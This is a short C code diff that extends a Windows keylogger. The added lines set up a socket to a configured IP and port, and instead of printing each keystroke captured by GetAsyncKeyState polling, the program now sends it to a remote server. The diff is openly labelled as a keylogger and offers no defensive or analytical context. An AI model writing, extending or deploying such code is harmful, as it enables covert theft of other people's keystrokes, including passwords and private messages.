@@ -7,10 +7,20 @@
 void app()
 {
     SOCKET client = init_connection();
+    struct sockaddr_in serv;
+    char client_message[BUF_SIZE];
+    memset(client_message, '\0', sizeof(client_message));
+
+    serv.sin_family = AF_INET;
+    serv.sin_port = htons(PORT);
+    serv.sin_addr.s_addr = inet_addr(IP);
+
+    printf("Keylogger start !");
+
     while (1)
         for (DWORD i = 0; i < 255; i++)
             if (GetAsyncKeyState(i) == -32767)
-                printf("%s", translate_key(i));
+                send_message(client, serv, translate_key(i));
 }
 
 void init(void)
